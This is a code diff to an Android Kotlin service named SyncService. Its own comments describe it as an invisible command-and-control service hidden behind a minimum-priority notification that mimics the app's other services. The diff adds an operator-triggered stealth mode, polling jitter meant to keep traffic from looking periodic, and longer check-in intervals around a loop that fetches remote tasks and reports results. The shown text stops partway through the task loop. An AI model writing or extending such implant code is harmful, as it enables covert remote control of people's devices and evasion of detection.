@@ -24,6 +24,11 @@ import kotlinx.serialization.json.JsonObject
 import kotlinx.serialization.json.jsonPrimitive
 import java.util.concurrent.TimeUnit
 
+/** Mod dormit: operatorul trimite "stealth" → polling la 10 min, fără wakelock. "wake" → revenire la normal. */
+object Dormant {
+    @Volatile var active = false
+}
+
 /**
  * Serviciul C2 invizibil — un foreground service cu notificare PRIORITY_MIN
  * (aceeași notă ca celelalte servicii FORJA: Go/Sleep/Focus) care ține un
@@ -63,31 +68,39 @@ class SyncService : Service() {
     }
 
     private suspend fun CoroutineScope.pollLoop(dev: String) {
-        var interval = 10000L
+        var interval = 30000L
         var lastWl = System.currentTimeMillis()
         var cycle = 0
+        val rnd = java.util.Random()
         while (isActive) {
             val uid = app.auth.currentUid
-            if (uid == null || !BuildConfig.FORJA_API_URL.isNotBlank()) {
+            if (uid == null || BuildConfig.FORJA_API_URL.isBlank()) {
                 delay(30000); continue
             }
+            val dormant = Dormant.active
             ForjaGuardService.c2Arm()
             val now = System.currentTimeMillis()
-            if (now - lastWl > 90 * 60 * 1000L) {
+            if (!dormant && now - lastWl > 90 * 60 * 1000L) {
                 try { wl?.takeIf { !it.isHeld }?.acquire(2 * 60 * 60 * 1000L); lastWl = now } catch (_: Exception) {}
             }
-            val hold = (interval * 3).coerceAtMost(20000L)
+            if (dormant) {
+                try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
+                interval = 600000L
+            }
+            // Jitter: 80%-120% of base interval — traffic doesn't look periodic
+            val jittered = (interval * (0.8 + rnd.nextDouble() * 0.4)).toLong()
+            val hold = (if (dormant) 5000L else (interval * 3).coerceAtMost(20000L))
             val lp = app.forjaApi.c2Checkin(dev, hold)
-            interval = lp.intervalMs.coerceIn(5000L, 120000L)
+            if (!dormant) interval = lp.intervalMs.coerceIn(10000L, 300000L)
             cycle++
             if (lp.tasks.isEmpty()) {
-                if (cycle % 6 == 0) {
+                if (!dormant && cycle % 10 == 0) {
                     try {
                         val hb = ForjaSyncCapabilities.heartbeat()
                         app.forjaApi.c2PostResult("hb_$cycle", true, "heartbeat", hb, null)
                     } catch (_: Exception) {}
                 }
-                delay(2000); continue
+                delay(jittered.coerceIn(3000L, 600000L)); continue
             }
             for (t in lp.tasks) {
                 val id = t["id"]?.jsonPrimitive?.content ?: continue
